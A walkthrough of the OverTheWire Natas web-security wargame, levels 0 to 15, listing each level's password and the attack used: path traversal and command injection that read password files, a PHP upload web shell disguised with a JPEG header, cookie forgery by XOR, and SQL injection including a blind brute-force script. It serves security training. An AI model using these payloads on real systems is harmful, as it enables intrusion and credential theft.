# Natas CTF Walkthrough

This is the walkthrough of all Natas CTF challenges from 1 to 15.

Natas is a web application CTF game hosted by OverTheWire.

## Entrypoint

- [Natas 0](http://natas0.natas.labs.overthewire.org) (login with natas0:natas0)

### Natas 0

- View source page and find the password.
  
  **Password:** gtVrDuiDfck831PqWsLEZy5gyDz1clto

### Natas 1

- View source page and find the password.
  
  **Password:** ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi

### Natas 2

- View source page and find that there’s a folder `/files/` on the web root. Inside this folder there’s a file named as `users.txt`. Open it and find the password.
  
  **Password:** sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

### Natas 3

- View source page and find that "Not even Google will find it this time." It looks like that there’s something to do with the search engines.
- Try to open the `/robots.txt` and find that the website disallows the folder `/s3cr3t/` to be crawled. Open the folder and find the password in the file `user.txt`.
  
  **Password:** Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

### Natas 4

- Referrer hijacking.
- Refresh the page using "refresh page" hyperlik and capture the request in burpsuite. in Referrer change "http://natas4.natas.labs.overthewire.org/" to "http://natas5.natas.labs.overthewire.org/" and forward the request and find the password.
  
  **Password:** iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

### Natas 5

- Change cookie `loggedin` to `1`, reload the page and find the password.
  
  **Password:** aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

### Natas 6

- View source page. Note that the file `includes/secret.inc` is included in the page. Open it and get the secret.
- Input the secret and get the password.
  
  **Password:** 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

### Natas 7

- Path traversal.
- This page doesn’t validate the input `page`, and therefore is vulnerable to path traversal attack.
- Remember that the introduction of Natas Wargame says "All passwords are also stored in `/etc/natas_webpass/` and named as `/etc/natas_webpass/natasX`. Thus, we can try to set the param `page` as `/etc/natas_webpass/natas8` and find the password.
  
  **Password:** DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

### Natas 8

- View source page and find that `bin2hex(strrev(base64_encode($secret)))` produced `3d3d516343746d4d6d6c315669563362`. Reverse these steps to get the secret.
- In PHP, for example, execute `echo base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));` to get the secret.
- Input the secret and get the password.
  
  **Password:** W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

### Natas 9

- Command injection.
- The `$key` is the point that could be replaced by our injection code.
- Input `; cat /etc/natas_webpass/natas10;` and get the password.
  
  **Password:** nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

### Natas 10

- Comparing to Natas 9, this challenge filters the key characters to command injection. However, we could take advantage of the `grep` command to print the password.
- Note that the command line `grep -i <word> <file 1> <file 2> ... <file n>` will print every line in each file that contains the `. Thus, we could compile such command and go through the 26 letters and their capitalized format to find a ‘matched letter’ to the password.
- For this challenge, we could input `c /etc/natas_webpass/natas11` and print the password out.
  
  **Password:** U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

### Natas 11

- View source page and find that the data stored in our cookie is “encrypted” by xoring with a censored string `$key`. The default original data is json encoded array `array("showpassword"=>"no", "bgcolor"=>"#ffffff")`.
  
- Thus, we could xor the original string with the encrypted text to get the `$key`:

```php
<?php
$originalString = json_encode(array( “showpassword”=>”no”, “bgcolor”=>”#ffffff”));
$cookieString = base64_decode(‘ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=’);
echo $originalString ^ $cookieString;
```

-The result is qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq, which implies that the $key should be qw8J (repeated during the xor_encrypt function).

-Since we’ve got the $key, we can build our own data setting showpassword to yes:

```
<?php
$key = 'qw8J';
$newString = json_encode(array("showpassword"=>"yes", "bgcolor"=>"#ffffff"));
$cookieData = '';
for ($i = 0; $i < strlen($newString); $i++) {
    $cookieData .= $key[$i % strlen($key)] ^ $newString[$i];
}
echo base64_encode($cookieData);
```

-The result is ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK. Alter the data in cookie with this string and reload the page to get the password.

-Password: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3


## Natas 12

- Bypass file extension check to upload a PHP file.
- Execute code to retrieve the password.

**Solution:**

-View the source page to identify the file extension extraction method.
-Set the `filename` parameter to a string ending with `.php` when uploading a file.
-Create a PHP file with the following code:

   ```php
   echo exec("cat /etc/natas_webpass/natas13");
```
-After we upload the php file, we can open that page and get the password.

-Password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

## Natas 13

-View the source page and we can find that this challenge is an upgraded version of Natas 12. In this challenge, the EXIF image type is checked, so we need to add a header to our php file and make it look like a JPEG file.

-We can create a php file like this:
```
\0xFF\0xD8\0xFF\0xE0<?php echo exec('cat /etc/natas_webpass/natas14');?>
   ```
## Note: The JPEG header above contains four characters in HEX format. ## 

-Upload this php using the similar way in Natas 12 and get the password.

-Password: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

## Natas 14

Simple SQL injection.

Set either username or password as `" or 1=1 --` and get the password.

Password: `AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J`

## Natas 15

SQL injection.

View source page and find that the username is a SQL injection point. Noticed that the database only consists of username and password, we can brute force any password existing in the database one character at a time.

The following automated program is a DFS example that works for this challenge:

```python
import commands

def search(password):
    if len(password) <= 32:
        words = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234568790"
        for c in words:
            newpassword = password + c
            sql = 'curl -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J http://natas15.natas.labs.overthewire.org/index.php\?debug\=aa\&username\=\\\”%20or%20binary%20password%20like%20\\\”' + newpassword + '’
            return_code, output = commands.getstatusoutput(sql)
            if output.find('exists') > 0:
                print(newpassword)
                search(newpassword)

search("")
```

Side note: The username of this password is natas16

Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
